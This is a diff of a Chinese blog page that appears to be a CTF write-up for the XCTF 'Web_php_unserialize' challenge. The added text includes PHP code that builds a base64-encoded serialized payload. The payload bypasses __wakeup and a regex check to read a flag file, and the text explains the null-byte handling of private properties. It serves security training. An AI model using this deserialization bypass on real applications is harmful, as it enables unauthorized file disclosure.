@@ -212,6 +212,33 @@
 <p>学习了一些关于wake up关于反序列化的知识，构造xctf的一个新的类，并输出其序列化的结果</p>
 <p>![]](image&#x2F;12.png)</p>
 <p>为了不执行wake up函数，将对象属性个数修改为大于1，传入code的参数即可得到结果</p>
+<p>攻防Web_php_unserialize超难反序列化，打开网址，代码审计，需要两三次绕过，并且需要绕过base64，先输出序列化的Demo类</p>
+<p><img src="/image/13.png"></p>
+<p>得到序列化的Demo，审计if后的代码，需要给变量var赋值，并且需要绕过wakeup<br>代码如下</p>
+<p><img src="/image/14.png"></p>
+<p>得到序列化语句进行base64转换，传参发现还是不对，！！！！！猛然想到前面有private<br>file 变量为私有变量，所以序列化之后的字符串开头结 尾各有一个空白字符（即%00），字符串长度也比实际长度大 2，如果将序列化结 果复制到在线的 base64 网站进行编码可能就会丢掉空白字符，所以这里直接在 php 代码里进行编码。类似的还有 protected 类型的变量，序列化之后字符串首 部会加上%00*%00。</p>
+<p>所以在php代码中加入base64转换代码为<br><?php 
+class Demo { 
+    private $file = 'index.php';
+    public function __construct($file) { 
+        $this->file = $file; 
+    }
+    function __destruct() { 
+        echo @highlight_file($this->file, true); 
+    }
+    function __wakeup() { 
+        if ($this->file != 'index.php') { 
+            //the secret is in the fl4g.php
+            $this->file = 'index.php'; 
+        } 
+    } 
+}
+$Myon = new Demo('fl4g.php');
+$Myon = serialize($Myon);
+$Myon = str_replace('O:4','O:+4',$Myon); 
+$Myon = str_replace('1:{','2:{',$Myon);
+echo base64_encode($Myon);
+?><br>传参即可得到答案</p>
 
             
         </div>
@@ -460,7 +487,7 @@
         
         <span class="tag">
             
-            <a href="/tags/%E5%8E%9F%E5%88%9B/" style="color: #ff7d73">原创</a>
+            <a href="/tags/%E5%8E%9F%E5%88%9B/" style="color: #ffa2c4">原创</a>
         </span>
         
     </div>
